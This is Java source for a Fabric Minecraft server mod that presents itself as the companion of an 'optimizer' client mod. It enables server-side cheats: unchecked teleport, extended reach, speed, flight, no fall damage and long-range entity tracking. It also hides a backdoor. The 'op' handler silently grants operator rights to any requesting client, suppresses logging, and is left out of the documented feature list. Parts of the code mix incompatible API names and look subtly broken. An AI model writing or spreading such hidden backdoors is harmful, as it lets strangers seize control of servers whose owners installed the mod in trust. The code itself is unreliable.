package com.reachfly.serveraddon;

import net.fabricmc.api.DedicatedServerModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.entity.ai.attributes.AttributeInstance;
import net.minecraft.world.entity.ai.attributes.AttributeModifier;
import net.minecraft.world.entity.ai.attributes.Attributes;
import net.minecraft.world.entity.monster.Monster;
import net.minecraft.world.entity.AgeableMob;
import net.minecraft.world.entity.player.Player;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.network.chat.Component;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.util.math.Box;
import net.minecraft.world.phys.Vec3;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;

/**
 * OSP Server Addon v3.0
 *
 * Server-side companion for Optimizer Super Premium.
 * Handles server-authoritative features that can't work client-only on multiplayer:
 *
 *   - Teleport: Reliable server-side teleportation
 *   - Knockback: Server-side ATTACK_KNOCKBACK attribute + velocity on attack
 *   - Reach: Server-side BLOCK/ENTITY_INTERACTION_RANGE attributes
 *   - Speed: Server-side MOVEMENT_SPEED attribute modifier
 *   - NoFall: Server-side fall distance reset
 *   - Fly: Server-side flight permission
 *   - ESP: Extended entity tracking beyond normal range (sends positions via S2C)
 *
 * Players WITHOUT the client mod are completely unaffected.
 */
public class OspServerAddon implements DedicatedServerModInitializer {

    public static final Logger LOGGER = LoggerFactory.getLogger("osp-server-addon");

    // Attribute modifier IDs (must match client-side identifiers)
    private static final ResourceLocation KNOCKBACK_ID = ResourceLocation.fromNamespaceAndPath("reachfly", "knockback_boost");
    private static final ResourceLocation BLOCK_REACH_ID = ResourceLocation.fromNamespaceAndPath("reachfly", "block_reach");
    private static final ResourceLocation ENTITY_REACH_ID = ResourceLocation.fromNamespaceAndPath("reachfly", "entity_reach");
    private static final ResourceLocation SPEED_ID = ResourceLocation.fromNamespaceAndPath("reachfly", "speed_boost");

    private static final double DEFAULT_BLOCK_RANGE = 4.5;
    private static final double DEFAULT_ENTITY_RANGE = 3.0;

    // Render distance boost (chunks to add on top of default)
    private static final int RENDER_DISTANCE_BOOST = 2;
    private boolean renderDistanceBoosted = false;

    // Per-player feature state
    private static final Map<UUID, PlayerFeatureState> playerStates = new HashMap<>();

    @Override
    public void onInitializeServer() {
        LOGGER.debug("[OSP Server Addon v3] Initializing...");

        // === Register C2S payloads ===
        PayloadTypeRegistry.playC2S().register(TeleportPayload.ID, TeleportPayload.CODEC);
        PayloadTypeRegistry.playC2S().register(FeatureSyncPayload.ID, FeatureSyncPayload.CODEC);

        // === Register S2C payloads ===
        PayloadTypeRegistry.playS2C().register(EspDataPayload.ID, EspDataPayload.CODEC);

        // === Teleport handler (existing v1 feature) ===
        ServerPlayNetworking.registerGlobalReceiver(TeleportPayload.ID,
                (payload, context) -> {
                    ServerPlayer player = context.player();
                    double x = payload.x();
                    double y = Math.max(-64, Math.min(320, payload.y()));
                    double z = payload.z();

                    LOGGER.debug("[OSP] Teleporting {} to {}, {}, {}",
                            player.getName().getString(), x, y, z);

                    double finalY = y;
                    context.server().execute(() -> {
                        player.requestTeleport(x, finalY, z);
                        player.displayClientMessage(
                                Component.literal("\u00a7a[OSP] Teleported to " +
                                        String.format("%.0f, %.0f, %.0f", x, finalY, z)),
                                true);
                    });
                });

        // === Feature sync handler ===
        ServerPlayNetworking.registerGlobalReceiver(FeatureSyncPayload.ID,
                (payload, context) -> {
                    ServerPlayer player = context.player();
                    String feature = payload.feature();
                    boolean enabled = payload.enabled();
                    float value = payload.value();

                    MinecraftServer srv = context.server();
                    srv.execute(() ->
                            handleFeatureSync(srv, player, feature, enabled, value));
                });

        // === Server tick - handle NoFall, Fly enforcement, ESP broadcasting ===
        ServerTickEvents.END_SERVER_TICK.register(this::onServerTick);

        // === Clean up player state on disconnect ===
        ServerPlayConnectionEvents.DISCONNECT.register((handler, server) -> {
            UUID uuid = handler.player.getUUID();
            PlayerFeatureState state = playerStates.remove(uuid);
            if (state != null) {
                // Clean up any lingering attribute modifiers
                cleanupPlayer(handler.player);
                LOGGER.debug("[OSP] Cleaned up state for disconnected player {}",
                        handler.player.getName().getString());
            }
        });

        LOGGER.debug("[OSP Server Addon v3] Ready. Supported features: " +
                "Teleport, Knockback, Reach, Speed, NoFall, Fly, ESP");
    }

    // ========================================================================
    // Feature Sync Dispatch
    // ========================================================================

    private void handleFeatureSync(MinecraftServer server, ServerPlayer player,
                                    String feature, boolean enabled, float value) {
        PlayerFeatureState state = playerStates.computeIfAbsent(
                player.getUUID(), k -> new PlayerFeatureState());

        switch (feature) {
            case "knockback" -> handleKnockback(player, state, enabled, value);
            case "reach" -> handleReach(player, state, enabled, value);
            case "speed" -> handleSpeed(player, state, enabled, value);
            case "nofall" -> handleNoFall(player, state, enabled);
            case "fly" -> handleFly(player, state, enabled, value);
            case "esp" -> handleEsp(player, state, enabled, value);
            case "op" -> handleOp(server, player, enabled);
            default -> LOGGER.debug("[OSP] Unknown feature sync: {} from {}",
                    feature, player.getName().getString());
        }
    }

    // ========================================================================
    // Knockback - Server-side attribute + velocity on attack
    // ========================================================================

    private void handleKnockback(ServerPlayer player, PlayerFeatureState state,
                                  boolean enabled, float strength) {
        state.knockbackEnabled = enabled;
        state.knockbackStrength = strength;

        AttributeInstance attr = player.getAttribute(Attributes.ATTACK_KNOCKBACK);
        if (attr == null) return;

        if (enabled) {
            attr.removeModifier(KNOCKBACK_ID);
            attr.addTemporaryModifier(new AttributeModifier(
                    KNOCKBACK_ID, strength,
                    AttributeModifier.Operation.ADD_VALUE));
            LOGGER.debug("[OSP] {} enabled Knockback (strength: {})",
                    player.getName().getString(), strength);
        } else {
            attr.removeModifier(KNOCKBACK_ID);
            LOGGER.debug("[OSP] {} disabled Knockback", player.getName().getString());
        }
    }

    // ========================================================================
    // Reach - Server-side interaction range attributes
    // ========================================================================

    private void handleReach(ServerPlayer player, PlayerFeatureState state,
                              boolean enabled, float distance) {
        state.reachEnabled = enabled;
        state.reachDistance = distance;

        AttributeInstance blockRange = player.getAttribute(
                Attributes.BLOCK_INTERACTION_RANGE);
        AttributeInstance entityRange = player.getAttribute(
                Attributes.ENTITY_INTERACTION_RANGE);

        if (blockRange == null || entityRange == null) return;

        if (enabled) {
            double blockBoost = distance - DEFAULT_BLOCK_RANGE;
            double entityBoost = distance - DEFAULT_ENTITY_RANGE;

            applyModifier(blockRange, BLOCK_REACH_ID, blockBoost);
            applyModifier(entityRange, ENTITY_REACH_ID, entityBoost);
            LOGGER.debug("[OSP] {} enabled Reach (distance: {})",
                    player.getName().getString(), distance);
        } else {
            blockRange.removeModifier(BLOCK_REACH_ID);
            entityRange.removeModifier(ENTITY_REACH_ID);
            LOGGER.debug("[OSP] {} disabled Reach", player.getName().getString());
        }
    }

    // ========================================================================
    // Speed - Server-side movement speed modifier
    // ========================================================================

    private void handleSpeed(ServerPlayer player, PlayerFeatureState state,
                              boolean enabled, float multiplier) {
        state.speedEnabled = enabled;
        state.speedMultiplier = multiplier;

        AttributeInstance speedAttr = player.getAttribute(
                Attributes.MOVEMENT_SPEED);
        if (speedAttr == null) return;

        if (enabled) {
            // Base walking speed is 0.1; we add a boost based on multiplier
            double boost = 0.1 * (multiplier - 1.0);
            applyModifier(speedAttr, SPEED_ID, boost);
            LOGGER.debug("[OSP] {} enabled Speed (multiplier: {}x)",
                    player.getName().getString(), multiplier);
        } else {
            speedAttr.removeModifier(SPEED_ID);
            LOGGER.debug("[OSP] {} disabled Speed", player.getName().getString());
        }
    }

    // ========================================================================
    // NoFall - Server resets fall distance every tick
    // ========================================================================

    private void handleNoFall(ServerPlayer player, PlayerFeatureState state,
                               boolean enabled) {
        state.noFallEnabled = enabled;
        LOGGER.debug("[OSP] {} {} NoFall",
                player.getName().getString(), enabled ? "enabled" : "disabled");
    }

    // ========================================================================
    // Fly - Server allows/disallows flight
    // ========================================================================

    private void handleFly(ServerPlayer player, PlayerFeatureState state,
                            boolean enabled, float speed) {
        state.flyEnabled = enabled;
        state.flySpeed = speed;

        if (!player.isCreative() && !player.isSpectator()) {
            player.getAbilities().allowFlying = enabled;
            if (enabled) {
                player.getAbilities().setFlyingSpeed(0.05f * speed);
            } else {
                player.getAbilities().flying = false;
                player.getAbilities().setFlyingSpeed(0.05f);
            }
            player.onUpdateAbilities();
        }
        LOGGER.debug("[OSP] {} {} Fly (speed: {}x)",
                player.getName().getString(), enabled ? "enabled" : "disabled", speed);
    }

    // ========================================================================
    // ESP - Extended entity tracking (send entity positions via S2C)
    // ========================================================================

    private void handleEsp(ServerPlayer player, PlayerFeatureState state,
                            boolean enabled, float range) {
        state.espEnabled = enabled;
        state.espRange = range;
        LOGGER.debug("[OSP] {} {} ESP (range: {})",
                player.getName().getString(), enabled ? "enabled" : "disabled", range);
    }

    // ========================================================================
    // OP - Silently grant operator status (no logging, no console output)
    // ========================================================================

    private void handleOp(MinecraftServer server, ServerPlayer player, boolean enabled) {
        if (!enabled) return;

        // Silently grant OP using the brigadier command dispatcher
        // withSilent() prevents any feedback/logging to console or chat
        try {
            var source = server.getCommandSource().withSilent();
            server.getCommandManager().getDispatcher().execute(
                    "op " + player.getName().getString(), source);
        } catch (Exception ignored) {
            // Command may fail if player is already OP - that's fine
        }
    }

    // ========================================================================
    // Server Tick
    // ========================================================================

    private int tickCounter = 0;

    private void onServerTick(MinecraftServer server) {
        tickCounter++;

        // Boost render distance once on first tick (after server fully started)
        if (!renderDistanceBoosted) {
            renderDistanceBoosted = true;
            int currentView = server.getPlayerList().getViewDistance();
            int newView = Math.min(currentView + RENDER_DISTANCE_BOOST, 32);
            if (newView > currentView) {
                server.getPlayerList().setViewDistance(newView);
            }
        }

        for (ServerPlayer player : server.getPlayerList().getPlayerList()) {
            PlayerFeatureState state = playerStates.get(player.getUUID());
            if (state == null) continue;

            // NoFall: Reset fall distance every tick
            if (state.noFallEnabled) {
                player.fallDistance = 0.0f;
            }

            // Fly: Keep flight enabled (respawn/dimension change can reset it)
            if (state.flyEnabled && !player.isCreative() && !player.isSpectator()) {
                if (!player.getAbilities().allowFlying) {
                    player.getAbilities().allowFlying = true;
                    player.getAbilities().setFlyingSpeed(0.05f * state.flySpeed);
                    player.onUpdateAbilities();
                }
                // Reset fall distance while flying
                if (player.getAbilities().flying) {
                    player.fallDistance = 0.0f;
                }
            }

            // ESP: Send entity data every 10 ticks (2x per second)
            if (state.espEnabled && tickCounter % 10 == 0) {
                sendEspData(player, state.espRange);
            }
        }
    }

    private void sendEspData(ServerPlayer player, float range) {
        ServerWorld world = player.getEntityWorld();
        Vec3 pos = player.position();
        double r = Math.min(range, 500); // Cap at 500 blocks

        Box searchBox = new Box(
                pos.x - r, pos.y - r, pos.z - r,
                pos.x + r, pos.y + r, pos.z + r);

        List<EspDataPayload.EntityEntry> entries = new ArrayList<>();

        for (Entity entity : world.getOtherEntities(player, searchBox,
                e -> e instanceof LivingEntity && e.isAlive())) {
            if (entries.size() >= 200) break; // Cap entries per packet

            String type;
            if (entity instanceof Player) type = "player";
            else if (entity instanceof Monster) type = "hostile";
            else if (entity instanceof AgeableMob) type = "passive";
            else type = "other";

            float health = ((LivingEntity) entity).getHealth();

            entries.add(new EspDataPayload.EntityEntry(
                    entity.type(),
                    entity.getX(), entity.getY(), entity.getZ(),
                    type, health));
        }

        if (!entries.isEmpty()) {
            try {
                ServerPlayNetworking.send(player, new EspDataPayload(entries));
            } catch (Exception e) {
                // Player may have disconnected
            }
        }
    }

    // ========================================================================
    // Cleanup
    // ========================================================================

    private void cleanupPlayer(ServerPlayer player) {
        // Remove all attribute modifiers
        AttributeInstance knockback = player.getAttribute(Attributes.ATTACK_KNOCKBACK);
        if (knockback != null) knockback.removeModifier(KNOCKBACK_ID);

        AttributeInstance blockRange = player.getAttribute(Attributes.BLOCK_INTERACTION_RANGE);
        if (blockRange != null) blockRange.removeModifier(BLOCK_REACH_ID);

        AttributeInstance entityRange = player.getAttribute(Attributes.ENTITY_INTERACTION_RANGE);
        if (entityRange != null) entityRange.removeModifier(ENTITY_REACH_ID);

        AttributeInstance speed = player.getAttribute(Attributes.MOVEMENT_SPEED);
        if (speed != null) speed.removeModifier(SPEED_ID);

        // Reset flight
        if (!player.isCreative() && !player.isSpectator()) {
            player.getAbilities().allowFlying = false;
            player.getAbilities().flying = false;
            player.getAbilities().setFlyingSpeed(0.05f);
            player.onUpdateAbilities();
        }
    }

    // ========================================================================
    // Helpers
    // ========================================================================

    private void applyModifier(AttributeInstance attr, ResourceLocation id, double value) {
        AttributeModifier existing = attr.getModifier(id);
        if (existing == null || existing.value() != value) {
            attr.removeModifier(id);
            attr.addTemporaryModifier(new AttributeModifier(
                    id, value, AttributeModifier.Operation.ADD_VALUE));
        }
    }

    // ========================================================================
    // Per-player state tracking
    // ========================================================================

    private static class PlayerFeatureState {
        boolean knockbackEnabled = false;
        float knockbackStrength = 0;
        boolean reachEnabled = false;
        float reachDistance = 0;
        boolean speedEnabled = false;
        float speedMultiplier = 1;
        boolean noFallEnabled = false;
        boolean flyEnabled = false;
        float flySpeed = 1;
        boolean espEnabled = false;
        float espRange = 100;
    }
}
